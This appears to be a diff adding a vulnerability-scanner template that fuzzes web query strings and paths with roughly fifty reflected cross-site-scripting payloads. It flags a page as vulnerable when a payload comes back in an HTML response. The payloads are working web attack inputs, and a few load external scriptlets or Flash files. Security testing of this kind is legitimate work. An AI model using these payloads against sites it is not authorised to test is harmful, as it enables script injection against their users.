@@ -1,0 +1,97 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<iframe/onload=alert(1)"
+        - "<script>document.vulnerable=true;</script"
+        - "<style>:target {color:red;}</style><output id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></output>"
+        - "<audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click</a>"
+        - "<basefont onmouseover=alert(1) href=&apos;javascript:javascript:alert(1)&apos;&gt;&lt;img src=&apos;x&apos;&gt;&lt;/xss&gt"
+        - "</html/onload>"
+        - "<meta onkeyup=\"alert(1)\">test</meta>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click
+<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>
+
+"
+        - "<basefont oncontextmenu=\"alert(1)\">test</basefont>"
+        - "<script>alert(\"XSS\");</script>"
+        - "<object code=\"&#114;&#108;/&#115;&#116;&#117;&#118;\" allowScriptAccess=always>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>"
+        - "<head draggable=\"true\" ondragleave=\"alert(1)\">test</head>"
+        - "<style>@keyframes slidein {}</style><thead style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></thead>"
+        - "<s onbeforecut=\"alert(1)\" contenteditable>test</s"
+        - "</object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>"
+        - "<object codebase=\"javascript:alert(1);\">"
+        - "<style>@keyframes x{}</style><optgroup style=\"animation-name:x\" onanimationend=\"alert(1)\"></optgroup>"
+        - "&lt;SCRIPT>alert(&#88;&#83;&#83;&lt;/SCRIPT&gt;)"
+        - "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\">"
+        - "<style>@keyframes x{}</style><dialog style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dialog>"
+        - "<div style=\"behaviour:url('#default#time2');width:expression(alert(100))\"></div>"
+        - "<style>@keyframes x{}</style><optgroup style=\"animation-name:x\" onanimationstart=\"alert(1)\"></optgroup>"
+        - "<style>:target {color:red;}</style><mark id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></mark>"
+        - "<style>:target {color:red;}</style><a id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></a>"
+        - "<script>alert(1)</script>"
+        - "<object type=image/png onload=alert(1) data=&#111;&#110;load=alert(1)//%3C/svg&#111;&#110; onload=alert(1)%3E>"
+        - "<style>@keyframes x{}</style><a style=\"animation-name:x\" onanimationstart=\"alert(1)\"></a>"
+        - "<meta content=\" 1 &#116;&#113;&#114;&#115;&#112;JAVASCRIPT&#58;&46;&#111;&#110;alert(1)\" http-equiv=\"refresh\"/>"
+        - "<s onkeydown=\"alert(1)\" contenteditable>test"
+        - "&lt;iframe/src=&quot;data:text/html,&lt;script&gt;&gt;&#09;"
+        - "<script>alert(\"XSS\");</script"
+        - "<script>alert('XSS')</script>"
+        - "<nobr onbeforecut=\"alert(1)\" contenteditable>test</nobr>"
+        - "<s oncontextmenu=\"alert(1)\">test"
+        - "&lt;&lt;&lt;img src=&quot;javascript:alert(1)&quot;&gt;&gt;&gt;"
+        - "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
+        - "<img src=\"data:image/svg+xml,<html xmlns='http://www.w3.org/1999/xhtml'><body/onload=javascript%3Aalert(1)></html"
+        - "<style>:target {color:red;}</style><bdi id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></bdi"
+        - "<object id=x onerror=javascript:alert(1);><param src=\"http://ha.ckers.org/scriptlet.html\">
+<meta http-equiv=\"refresh\" content=\"0; javascript:alert(1)\"></meta><frame onloadstart=alert(1)>"
+        - "<a onmousemove=\"alert(1)\">test</a>"
+        - "<body onmousemove=\"alert(1)\">test</body>"
+        - "&lt;/html&gt;&lt;/body&gt;<embed code=\"http://ha.ckers.org/js/xss.swf\" allowscriptaccess=always/"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
